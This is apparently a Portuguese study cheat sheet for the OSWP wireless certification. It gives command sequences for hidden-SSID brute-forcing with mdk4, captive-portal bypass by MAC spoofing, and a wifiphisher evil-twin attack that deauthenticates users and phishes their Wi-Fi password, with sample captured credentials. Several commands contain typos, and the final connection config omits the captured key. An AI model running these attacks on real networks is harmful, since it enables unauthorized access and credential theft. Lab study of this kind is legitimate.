# Wi-Fi
OSWP Exam Prep

## Configuração do ambiente
### Encerrar processos: Interrompe serviços como o Gerenciador de Rede que interferem com ferramentas sem fio.
```
mkdir ~/exam && cd ~/exam
```
```
sudo airmon-ng check kill
```
### Verifique se o seu dispositivo é compatível com o modo monitor.
```
iw list
```
## Iniciar o Modo Monitor

Coloca a placa de rede sem fio em um modo onde ela pode capturar todo o tráfego, não apenas o tráfego destinado ao seu computador.
```
sudo airmon-ng start wlan0
```
ou
```
ifconfig <wlan#> down
iwconfig <wlan#> mode monitor OR 
iw <wlan#> set type monitor
ifconfig <wlan#> up
```
### Modo de verificação: Certifique-se de que a interface (geralmente renomeada para `wlan0mon`) esteja no modo de monitoramento.
```
iwconfig | grep wlan
```
ou
```
iw dev
```

## Ambiente virtualizado
(Caso você não tenha uma placa de rede Wi-Fi física e esteja emulando adaptadores Wi-Fi)

Você pode utilizar o módulo do kernel mac80211_hwsim, que funciona como um simulador de software para rádios 802.11. Isso permite realizar ataques Wi-Fi complexos em um ambiente virtual sem a necessidade de múltiplos adaptadores Wi-Fi USB físicos.

### 1. Inicializando os rádios virtuais
```
modprobe mac80211_hwsim radios=4
```
### 2. Identificação das interfaces
```
iwconfig
```
### 3. Desativar interfaces simuladas
```
rmmod mac80211_hwsim
```
## Configurações avançadas da interface sem fio
```
iw dev
```
```
iw phy phy2 info
```
```
airmon-ng
```
### Inspeção das capacidades do condutor
```
modinfo mac80211_hwsim
```
### Domínio regulatório e poder
```
iw reg get
```
### Alterando o domínio regulatório
```
sudo iw reg set US
```

## Reconhecimento
### Analisar todas as bandas
Varredura detalhada das bandas de 2,4 GHz e 5 GHz para encontrar o BSSID, o canal e o ESSID do alvo.
```
sudo airodump-ng --band abg wlan0mon
```

### Captura direcionada
Assim que o alvo for encontrado, bloqueie o adaptador nesse canal específico para capturar os dados.
```
sudo airodump-ng -c <channel> wlan0mon
```

### Exemplo de reconhecimento
Recomendo criar uma pasta "Wi-Fi" e armazenar todas as capturas lá.
```
mkdir ~/wifi
```
```
sudo airmon-ng start wlan0
```
```
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
```

## Autenticação aberta - WPA
```
nano free.conf
```
```
network={
  ssid="$ESSID"
  key_mgmt=NONE
  scan_ssid=1
}
```
```
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
```
### Em outro terminal como root:
```
sudo dhclient wlan2 -v
```

## Criptografia sem fio oportunista - WPA
```
nano owe.conf
```
```
network={        
    ssid="SweetB-OWE"        
    key_mgmt=OWE        
    pairwise=CCMP
}
```
```
wpa_supplicant -i wlan1 -c owe.conf
```

### Análise e Rastreamento de Tráfego
Agora, use um segundo rádio para capturar o tráfego e analisá-lo.
```
airmon-ng start wlan2
```
Localize o alvo: Analise todas as bandas para encontrar o canal e o BSSID de SweetB-OWE:
```
airodump-ng --band abg wlan2mon
```
Captura para PCAP: Depois de obter o canal ( -c) e o BSSID ( --bssid), inicie uma captura focada:
```
airodump-ng -c <#> --essid SweetB-OWE --bssid <mac> -w <output.pcap> --output-format pcap
```
```
airodump-ng -c 6 --essid SweetB-OWE --bssid CE:9E:05:59:B3:CE -w output_owe --output-format pcap wlan2mon
```

## Redes Wi-Fi ocultas
### Encontrando o ESSID do AP oculto
Coloque o adaptador no modo monitor e faça uma varredura de todas as bandas.
```
sudo airmon-ng start wlan0
```
```
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
```
O comando faz isso em uma única linha.
```
cat ~/10-million-password-list-top-100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
``` 
Assim que tivermos o dicionário modificado, podemos usar o “mdk4” para iniciar sondagens com cada um dos ESSIDs até que o AP responda.
```
sudo airmon-ng start wlan1
```
```
sudo iwconfig wlan1mon channel11
```
```
mdk4 wlan1mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
```

### Conectando-se a uma rede Wi-Fi oculta
```
nano free.conf
```
```
network={
    ssid="$ESSID"
    key_mgmt=NONE
    scan_ssid=1
}
```
```
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
```
### Em outro terminal:
```
sudo dhclient wlan2 -v
```

## Portais cativos
```
sudo airmon-ng start wlan0
```
```
sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c 6
```
```
nano open.conf
```
```
network={
  ssid="wifi-guest"
  key_mgmt=NONE
}
```
```
wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
```
Em outro terminal:
```
sudo dhclient-vwlan2
```
```
systemctl stop network-manager
```
```
ip link set wlan2 down
```
```
macchanger -m b0:72:bf:44:b0:49 wlan2
```
```
ip link set wlan2 up
```
```
wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
```
```
sudo dhclient -v wlan2
```
```
wireshark ~/*.cap
```
```
Item do formulário: "Nome de usuário" = "free2"

Item do formulário: "Senha" = "5LqwwccmTg6C39y"
```

## Portal cativo com WIFIphisher
https://github.com/wifiphisher/wifiphisher

### Ferramenta — wifiphisher
O wifiphisher automatiza todo o ataque: ponto de acesso falso, desautenticação, DHCP, redirecionamento de DNS, servidor web e captura de credenciais — tudo em um único comando.
```
sudo wifiphisher -aI wlan1 -eI wlan0
```
### Passo 1 — Inicie o wifiphisher
```
sudo wifiphisher -aI wlan1 -eI wlan0
```
O wifiphisher inicia, escaneia todos os canais e apresenta uma lista de redes próximas. Selecione o alvo e, em seguida, selecione o cenário de phishing.

### Etapa 2 — Experiência da Vítima
Após a execução do wifiphisher, eis o que acontece no dispositivo da vítima:

- Desautenticação — a rede wlan0 do phisher envia pacotes de desautenticação continuamente — a vítima perde a conexão Wi-Fi com o ponto de acesso legítimo.

- Duas redes — o dispositivo da vítima vê duas redes nomeadas wifi-mobile— real (WPA2) + não autorizada (aberta)

- Conexão automática — o dispositivo se conecta à rede aberta automaticamente — sem solicitação de senha.

- DHCP — o servidor DHCP integrado do wifiphisher atribui um endereço IP (ex: 10.0.0.x)

- Redirecionamento de DNS — todas as consultas de DNS retornam o IP do portal cativo — qualquer solicitação do navegador é direcionada para nossa página.

- Portal exibido — a vítima vê a página falsa de "Atualização de Firmware do Roteador".

  
### Etapa 3 — Senha Capturada
A vítima digita sua senha de Wi-Fi no portal falso e clica em Enviar. A senha aparece imediatamente no terminal do golpista em texto simples.
```
[*] Captured credentials:
    ESSID: wifi-mobile
    Password: starwars1

[*] Please wait while we verify the credentials...
```

### Etapa 4 — Verificar: Duas redes em varredura
Confirme se ambas as redes estão visíveis e se o ponto de acesso não autorizado ainda está funcionando juntamente com o legítimo.
```
sudo iw dev wlan2 scan | grep-i "SSID: wifi-mobile"
```
```
SSID: wifi-mobile     ← real AP (WPA2)
SSID: wifi-mobile     ← rogue AP (open)
```
Execute o airodump-ng para confirmar visualmente ambas as entradas com diferentes tipos de segurança:
```
sudo airmon-ng start wlan2
```
```
sudo airodump-ng wlan2mon --band abg
```
```
sudo airmon-ng stop wlan2mon
```
Tentar uma conexão simples falhará — o WPA2 requer o wpa_supplicant:
```
sudo iw dev wlan2 connect "wifi-mobile" # fails — WPA2 requires wpa_supplicant
```

### Etapa 5 — Conecte-se com o wpa_supplicant
Crie um arquivo de configuração e conecte-se usando a senha capturada.
```
nanofree.conf
```
```
network={
    ssid="wifi-mobile"
    key_mgmt=NONE
}
```
```
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
```

### Etapa 6 — Obtenha o IP e verifique o acesso.
```
sudo dhclient wlan2 -v
```

### Resumo dos comandos
Lançar wifiphisher
```
sudo wifiphisher -aI wlan1 -eI wlan0
```

Procure a rede alvo
```
sudo iw dev wlan2 scan | grep -i "SSID: wifi-mobile"
```

Iniciar modo de monitoramento
```
sudo airmon-ng start wlan2
```

Confirme duas redes.
```
sudo airodump-ng wlan2mon --band abg
```

Parar modo de monitoramento
```
sudo airmon-ng stop wlan2mon
```

Conecte-se via wpa_supplicant
```
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
```

Obter endereço IP
```
sudo dhclient wlan2 -v
```
